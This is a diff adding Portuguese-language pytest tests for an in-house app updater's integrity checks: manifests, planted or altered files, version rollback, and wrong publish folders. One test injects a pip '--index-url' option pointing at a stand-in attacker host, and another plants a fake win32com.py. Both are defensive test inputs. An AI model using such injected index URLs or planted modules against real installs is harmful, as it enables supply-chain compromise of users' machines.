@@ -119,6 +119,7 @@ def test_falha_no_pip_mantem_a_versao_anterior(servidor, pc):
     iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
     publicar.publicar(servidor)
     (servidor / "app" / "requirements.txt").write_text("biblioteca-nova\n")
+    publicar.escrever_manifesto(servidor / "app", iniciar.ler_versao(servidor / "app"))  # publicação legítima
 
     def pip_quebrado(_):
         raise RuntimeError("sem internet")
@@ -193,3 +194,107 @@ def test_ler_origem(tmp_path):
     assert str(iniciar.ler_origem(ini)).endswith("AutomacaoClaims\\app") or \
         "AutomacaoClaims" in str(iniciar.ler_origem(ini))
     assert iniciar.ler_origem(tmp_path / "nao_existe.ini") is None
+
+
+def test_todo_modulo_importado_vai_para_a_producao():
+    """Um módulo novo esquecido em ARQUIVOS_DO_PROGRAMA quebraria o programa dos orçamentistas."""
+    import ast
+    locais = {p.stem for p in RAIZ.glob("*.py")}
+    enviados = {n[:-3] for n in publicar.ARQUIVOS_DO_PROGRAMA if n.endswith(".py")}
+    so_dev = {"sap_fake", "ensaio", "publicar"}      # importados só em simulação/desenvolvimento
+    faltando = set()
+    for nome in enviados:
+        arvore = ast.parse((RAIZ / f"{nome}.py").read_text(encoding="utf-8"))
+        for no in ast.walk(arvore):
+            modulos = [a.name for a in no.names] if isinstance(no, ast.Import) else \
+                      [no.module] if isinstance(no, ast.ImportFrom) and no.module else []
+            faltando |= {m.split(".")[0] for m in modulos if m.split(".")[0] in locais} - enviados - so_dev
+    assert not faltando, f"Módulos usados mas não publicados: {sorted(faltando)}"
+
+
+# ------------------------------------------------------------------ integridade (revisão da banca, 27/10/2026)
+
+def test_pacote_tem_manifesto_com_todos_os_arquivos(tmp_path):
+    import json
+    destino = tmp_path / "app"
+    publicar.montar_pacote(RAIZ, destino, "1.0.0")
+    manifesto = json.loads((destino / "manifesto.json").read_text(encoding="utf-8"))
+    assert manifesto["versao"] == "1.0.0" and "ui.py" in manifesto["arquivos"]
+    assert iniciar.conferir_manifesto(destino, "1.0.0") == ""
+
+
+def test_arquivo_estranho_no_servidor_recusa_a_atualizacao(servidor, pc):
+    publicar.publicar(servidor)
+    (servidor / "app" / "win32com.py").write_text("import os  # plantado\n")
+    assert "recusada" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
+    assert not (pc / "app").exists() and not (pc / "app_novo").exists()
+
+
+def test_arquivo_alterado_no_servidor_recusa_e_mantem_a_versao(servidor, pc):
+    publicar.publicar(servidor)
+    iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
+    publicar.publicar(servidor)
+    with open(servidor / "app" / "ui.py", "a", encoding="utf-8") as f:
+        f.write("\n# alterado depois de publicar\n")
+    assert "recusada" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
+    assert iniciar.ler_versao(pc / "app") == "1.0.0"
+
+
+def test_versao_mais_antiga_no_servidor_e_ignorada(servidor, pc):
+    publicar.publicar(servidor, versao="2.0.0")
+    iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
+    (servidor / "app" / "versao.txt").write_text("1.9.0\n")
+    assert "mais antiga" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
+    assert iniciar.ler_versao(pc / "app") == "2.0.0"
+
+
+def test_depois_do_manifesto_versao_sem_manifesto_e_recusada(servidor, pc):
+    publicar.publicar(servidor)
+    iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
+    publicar.publicar(servidor)
+    (servidor / "app" / "manifesto.json").unlink()
+    assert "recusada" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
+
+
+def test_publicar_recusa_pasta_que_nao_e_da_publicacao(tmp_path):
+    # Revisão de 27/10/2026: caminho digitado errado não pode ter subpastas apagadas/renomeadas.
+    grupo = tmp_path / "grupo"
+    (grupo / "app").mkdir(parents=True)
+    (grupo / "app" / "planilha.xlsx").write_text("dados do grupo")
+    with pytest.raises(ValueError, match="não é a pasta de publicação"):
+        publicar.publicar(grupo)
+    assert (grupo / "app" / "planilha.xlsx").exists() and not (grupo / "app_anterior").exists()
+
+
+def test_primeira_publicacao_deixa_o_marcador(servidor):
+    publicar.publicar(servidor)
+    assert (servidor / publicar.MARCADOR).exists()
+    publicar.publicar(servidor)                         # a segunda reconhece a pasta
+
+
+# ------------------------------------------------------------------ 2ª banca (27/10/2026)
+
+def test_thumbs_db_do_explorer_nao_trava_a_atualizacao(servidor, pc):
+    publicar.publicar(servidor)
+    (servidor / "app" / "assets").mkdir(exist_ok=True)
+    (servidor / "app" / "assets" / "Thumbs.db").write_bytes(b"x")
+    (servidor / "app" / "desktop.ini").write_text("[.ShellClassInfo]")
+    assert "atualizado" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
+    assert not (pc / "app" / "desktop.ini").exists()            # não é copiado
+
+
+def test_requirements_com_opcao_do_pip_e_recusado(servidor, pc):
+    publicar.publicar(servidor)
+    (servidor / "app" / "requirements.txt").write_text("--index-url http://atacante/simple\npywin32==312\n")
+    publicar.escrever_manifesto(servidor / "app", iniciar.ler_versao(servidor / "app"))   # manifesto refeito
+    chamadas = []
+    assert "recusada" in iniciar.atualizar(servidor / "app", pc, instalar_libs=chamadas.append)
+    assert chamadas == [] and not (pc / "app").exists()
+
+
+def test_versao_nao_numerica_no_servidor_e_ignorada(servidor, pc):
+    publicar.publicar(servidor, versao="2.0.0")
+    iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
+    (servidor / "app" / "versao.txt").write_text("1.0.1-hotfix\n")
+    assert "ignorada" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
+    assert iniciar.ler_versao(pc / "app") == "2.0.0"
